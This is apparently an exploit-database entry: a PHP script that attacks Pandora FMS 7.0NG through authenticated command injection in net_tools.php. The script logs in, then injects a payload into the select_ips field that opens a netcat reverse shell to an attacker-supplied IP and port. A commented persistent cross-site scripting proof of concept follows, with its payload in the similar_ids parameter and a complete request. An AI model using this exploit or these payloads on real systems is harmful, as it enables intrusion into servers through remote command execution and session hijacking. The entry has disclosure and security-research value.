# Exploit Title: Pandora FMS 7.0NG - 'net_tools.php' Remote Code Execution
# Build: PC170324 - MR 0
# Date: 2020-03-30
# Exploit Author: Basim Alabdullah
# Vendor homepage: http://pandorafms.org/
# Version: 7.0
# Software link: https://pandorafms.org/features/free-download-monitoring-software/
# Tested on: CentOS
#
#                 Authenticated Remote Code Execution
#
#			Vulnerable file: extension/net_tools.php
#            Vulnerable Code:
#
#           $traceroute = whereis_the_command ('traceroute');
#			if (empty($traceroute)) {
#				ui_print_error_message(__('Traceroute executable does not exist.'));
#			}
#			else {
#				echo "<h3>".__("Traceroute to "). $ip. "</h3>";
#				echo "<pre>";
#	   ---->	echo system ("$traceroute $ip");
#				echo "</pre>";
#
#
<?php

error_reporting(0);
$username = $argv[2];
$password = $argv[3];
$url = $argv[1]."/index.php?login=1";
$postinfo = "nick=".$username."&pass=".$password."&login_button=Login";
$attackerip = $argv[4];
$attackerport = $argv[5];
$payload="127.0.0.1;{/home/daniel/nc,-e,/bin/sh,".$attackerip.",".$attackerport."}";

if(!empty($argv[1]))
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_NOBODY, false);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.tmp");
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_REFERER, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postinfo);
    curl_exec($ch);
    curl_close($ch);
    $ch1 = curl_init();
    curl_setopt($ch1, CURLOPT_HEADER, false);
    curl_setopt($ch1, CURLOPT_NOBODY, false);
    curl_setopt($ch1, CURLOPT_URL, $argv[1]."/index.php?login=1&login=1&sec=estado&sec2=operation/agentes/ver_agente&tab=extension&id_agente=1&id_extension=network_tools");
    curl_setopt($ch1, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch1, CURLOPT_COOKIEFILE, "cookie.tmp");
    curl_setopt($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7");
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch1, CURLOPT_REFERER, $url);
    curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch1, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch1, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch1, CURLOPT_POST, 1);
    curl_setopt($ch1, CURLOPT_POSTFIELDS, "operation=2&select_ips=".$payload."&community=public&submit=Execute");
    curl_exec($ch1);
    curl_close($ch1);
    echo $payload."\n";
}
else{
    echo "\n\nphp exploit.php http://127.0.0.1/pandora_console/ username password attacker-ip attacker-port\n\n";
}
?>

#
# Persistent Cross-Site Scripting.
# The value of the similar_ids request parameter is copied into the value of an HTML tag attribute which is an event handler and is encapsulated in double quotation marks. The payload 23859';document.location=1//981xgeu3m was submitted in the similar_ids parameter. This input was echoed as 23859&#039;;document.location=1//981xgeu3m in the application's response.
#
# GET /pandora_console/ajax.php?page=include%2Fajax%2Fevents&get_extended_event=1&group_rep=1&event_rep=1&dialog_page=general&similar_ids=2123859'%3bdocument.location%3d1%2f%2f981xgeu3m&timestamp_first=1585865889&timestamp_last=1585865889&user_comment=&event_id=21&server_id=0&meta=0&childrens_ids=%5B0%2C12%2C8%2C4%2C9%2C2%2C10%2C13%2C11%5D&history=0
# HTTP/1.1
# Host: pandorafms.host
# User-Agent: Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0
# Accept: text/html, */*; q=0.01
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate
# Referer: http://pandorafms.host/pandora_console/index.php?sec=eventos&sec2=operation/events/events
# X-Requested-With: XMLHttpRequest
# Connection: close
# Cookie: clippy_is_annoying=1; PHPSESSID=tn2pdl4p1qiq4bta26psj0mcj1